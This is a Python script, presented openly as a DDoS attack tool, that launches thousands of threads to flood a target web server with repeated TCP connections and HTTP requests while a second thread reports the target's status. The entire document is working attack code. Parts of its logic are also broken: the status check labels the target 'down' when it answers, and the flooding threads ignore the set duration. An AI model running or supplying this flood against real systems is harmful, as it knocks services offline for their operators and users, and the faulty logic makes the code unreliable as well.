import socket
import threading
import time

# Configuration
target = 'example.com'
port = 80
duration = 60  # Duration in seconds
threads = 10000  # Number of threads
packets_per_second = 10000000  # 10 million packets per second

def ddos():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + target + "\r\n\r\n").encode('ascii'), (target, port))
            s.close()
        except:
            pass

def notify_status():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((target, port))
            s.close()
            print(f"[+] {target} is down")
            break
        except:
            print(f"[+] {target} is up")
            time.sleep(1)

def main():
    print(f"[+] Starting DDoS attack on {target} for {duration} seconds...")
    start_time = time.time()

    for _ in range(threads):
        threading.Thread(target=ddos).start()

    threading.Thread(target=notify_status).start()

    while time.time() - start_time < duration:
        time.sleep(1)

    print(f"[+] DDoS attack finished.")

if __name__ == "__main__":
    main()